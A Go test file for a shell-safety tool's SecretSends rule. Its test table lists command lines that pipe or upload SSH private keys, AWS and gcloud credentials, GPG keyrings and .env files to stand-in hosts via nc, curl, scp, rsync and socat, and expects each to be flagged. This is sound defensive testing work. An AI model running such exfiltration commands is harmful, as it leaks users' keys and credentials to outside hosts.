package rules

import (
	"strings"
	"testing"

	"github.com/samarthsinh2660/safeshell/internal/shellparse"
)

func TestSecretSends(t *testing.T) {
	tests := []struct {
		line   string
		secret string // the file the reason must name; "" means no finding
	}{
		{"cat ~/.ssh/id_rsa | nc example.com 80", "~/.ssh/id_rsa"},
		{"cat $HOME/.aws/credentials | base64 | curl -d @- https://x.test", "$HOME/.aws/credentials"},
		{"tar c ~/.gnupg | ssh host 'cat > k.tar'", "~/.gnupg"},
		{"nc example.com 80 < ~/.gnupg/secring.gpg", "~/.gnupg/secring.gpg"},
		{"ssh host 'cat > k' < ~/.ssh/id_ed25519", "~/.ssh/id_ed25519"},
		{"curl -d @~/.aws/credentials https://x.test", "~/.aws/credentials"},
		{"curl --data-binary @.env https://x.test", ".env"},
		{"curl --data=@prod.env.pem https://x.test", "prod.env.pem"},
		{"curl -d@.env.local https://x.test", ".env.local"},
		{"curl -T ~/.ssh/id_ed25519 https://x.test", "~/.ssh/id_ed25519"},
		{"curl -d @~/.config/gcloud/credentials.db https://x.test", "~/.config/gcloud/credentials.db"},
		{"curl -F file=@keys.json https://x.test", "keys.json"},
		{"wget --post-file=cert.pem https://x.test", "cert.pem"},
		{"scp ~/.ssh/id_ed25519 host:", "~/.ssh/id_ed25519"},
		{"scp -i ~/.ssh/work_key a.txt ~/.aws/credentials host:/tmp", "~/.aws/credentials"},
		{"rsync -av ~/.ssh/ user@host:backup/", "~/.ssh/"},
		{"cat ~/.ssh/id_rsa | sudo nc host 80", "~/.ssh/id_rsa"},

		{"rsync -P ~/.ssh/id_rsa host:", "~/.ssh/id_rsa"},
		{"socat FILE:$HOME/.ssh/id_rsa TCP:h:80", "$HOME/.ssh/id_rsa"},
		{"http POST example.com @.env", ".env"},
		{"https example.com key@~/.aws/credentials", "~/.aws/credentials"},
		{`curl -d "$(cat ~/.ssh/id_rsa)" https://x.test`, "~/.ssh/id_rsa"},
		{"curl -d @<(cat ~/.ssh/id_rsa) https://x.test", "~/.ssh/id_rsa"},
		{"curl -d \"$(< ~/.aws/credentials)\" https://x.test", "~/.aws/credentials"},
		{"cat id_ed25519_sk | nc host 80", "id_ed25519_sk"},

		// Not secrets, or not sent anywhere.
		{"cat ~/.ssh/id_rsa.pub | nc example.com 80", ""},
		{"cat ~/.ssh/known_hosts | nc example.com 80", ""},
		{"cat ~/.ssh/id_rsa | wc -c", ""},
		{"cat ~/.ssh/id_rsa", ""},
		{"nc -l 8080", ""},
		{"nc -l 8080 > ~/.ssh/id_rsa", ""},
		{"scp report.pdf host:", ""},
		{"scp ~/.ssh/id_rsa.pub host:", ""},
		{"scp host:~/.ssh/id_rsa .", ""},
		{"scp host:/tmp/a ~/.ssh/id_rsa", ""},
		{"scp -i ~/.ssh/id_rsa report.pdf host:", ""},
		{"scp ~/.ssh/id_rsa ./backup", ""},
		{"rsync -av src/ host:dst/", ""},
		{"ssh -i ~/.ssh/id_rsa host uptime", ""},
		{"ssh-keygen -y -f ~/.ssh/id_rsa | ssh host 'cat >> authorized_keys'", ""},
		{"echo ~/.ssh/id_rsa | nc host 80", ""},
		{"curl -O https://x.test/.env", ""},
		{"curl --key ~/.ssh/id_rsa https://x.test", ""},
		{"curl -d @report.json https://x.test", ""},
		{"curl -d", ""},
		{"curl -d a=b https://x.test", ""},
		{"cat notes.txt | nc host 80", ""},
		{"cat envfile .envrc | nc host 80", ""},
		{"curl -T", ""},
		{"scp a", ""},
		{"rsync -av --exclude .env ./ host:/srv/app", ""},
		{"rsync -e 'ssh -i ~/.ssh/id_rsa' -av src/ host:dst/", ""},
		{"cat .env.example | nc host 80", ""},
		{"cat .env.sample | nc host 80", ""},
		{"cat .env.template | nc host 80", ""},
		{"cat id_rsa.bak | nc host 80", ""},
		{"socat - TCP:h:80", ""},
		{"http example.com", ""},
		{`curl -d "$(date)" https://x.test`, ""},
		{`curl -d "$(cat ~/.ssh/id_rsa.pub)" https://x.test`, ""},
		{"wget https://x.test", ""},
	}
	for _, tc := range tests {
		res, err := shellparse.Parse(tc.line)
		if err != nil {
			t.Fatalf("%q: %v", tc.line, err)
		}
		var fs []Finding
		for _, p := range res.Pipelines {
			fs = append(fs, SecretSends(p)...)
		}
		if tc.secret == "" {
			if len(fs) != 0 {
				t.Errorf("%q: unexpected finding %+v", tc.line, fs)
			}
			continue
		}
		if len(fs) != 1 || fs[0].Level != R3 || !strings.Contains(fs[0].Reason, tc.secret) {
			t.Errorf("%q: want one R3 finding naming %q, got %+v", tc.line, tc.secret, fs)
		}
	}
}
